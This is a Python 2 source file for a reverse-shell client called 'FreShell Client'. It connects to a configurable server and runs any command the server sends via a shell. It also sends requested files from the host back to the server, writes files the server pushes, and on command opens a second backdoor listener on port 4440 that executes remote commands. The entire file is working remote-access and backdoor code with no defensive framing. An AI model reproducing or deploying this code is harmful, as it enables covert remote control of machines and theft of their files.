import multiprocessing
import os
import socket
import subprocess
import sys

# FreShell Client - A simple Python Reverse Shell

host = '127.0.0.1'
port = 443

def connect():
    # Create socket & connect to server
    global s
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    except socket.error:
        print "[-] Cannot create socket."
    try:
        s.connect((host, port))
    except socket.error:
        print "[-] Cannot connect to server."

# Interactive Shell		(For Hidden, shell=False)
def command():
    cmd = subprocess.Popen(srv_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = cmd.stdout.read() + cmd.stderr.read()
    s.send(output)

def bd_command():
    cmd = subprocess.Popen(bdr, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
    output = cmd.stdout.read() + cmd.stderr.read()
    bd_conn.send(output)

# Upload File
def send_file():
    try:
        name_f = s.recv(1024)
    except socket.error:
        print "[-] Cannot recover file name."
    print "Sending File: ", name_f
    snd_f = open(name_f, "rb")
    read = snd_f.read()
    try:
        s.send(read)
    except socket.error:
        print "[-] Cannot send file data."

# Recover File
def recover_file():
    namef = s.recv(1024)
    word_l = namef.split("/")
    filename = word_l[-1]
    print "[+] Filename: ", filename
    try:
        data_f = s.recv(10000)
    except socket.error:
        print "[-] Cannot Recover File."
    rcv_f = open(filename, "wb")
    rcv_f.write(data_f)
    rcv_f.close()
    print "[+] Retrieved File"

# Create
def backdoor():
    global bds
    global bd_conn
    global bdr
    bd_host = ''
    bd_port = 4440

    bds = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        bdb = bds.bind((bd_host, bd_port))
    except:
        print "Cannot bind port & host"
        exit()
    bds.listen(1)
    print "Backdoor opened: Listening on port: ", bd_port
    bd_conn, bd_addr = bds.accept()
    print "Server connected: ", bd_addr
    while True:
        bdr = bd_conn.recv(1024)
        if bdr == "QUIT":
            print "Disconnecting from client"
            bd_conn.close()
            print "Closing backdoor."
            bds.close()
            break
        bd_command()

def main():
    while True:
        try:
            global srv_cmd
            srv_cmd = s.recv(1024)
        except socket.error:
            print "Cannot recover command"
        split = srv_cmd.split(" ")
        cd = split[0]
        path = split[-1]
        if srv_cmd == "quit":
            print "[-] Interactive Mode Disabled."
        elif srv_cmd == "D1SC0NN3CT":
            print "[-] Disconnecting from server."
            p.terminate()
            s.close()
            exit()
        elif srv_cmd == "D1SC0NN3CT2":
            print "[-] Disconnecting from server."
            p.terminate()
            s.close()
            exit()
        elif srv_cmd == "rcv_cli":
            send_file()
        elif srv_cmd == "snd_cli":
            recover_file()
        elif srv_cmd == "bd_me":
            try:
                p = multiprocessing.Process(target=backdoor)
                p.start()
                s.send("pwned")
            except:
                print "Couldn't create backdoor process."
        elif srv_cmd == "kill_bd":
            try:
                p.terminate()
                s.send("bd_killed")
                print "Killed Process"
            except:
                print "Couldn't kill process"
        # Change Directory & Interactive Shell
        else:
            if cd == "cd":
                os.chdir(path)
                print "[+] New Directory: ", os.getcwd()
            else:
                command()
    s.close()

connect()
main()
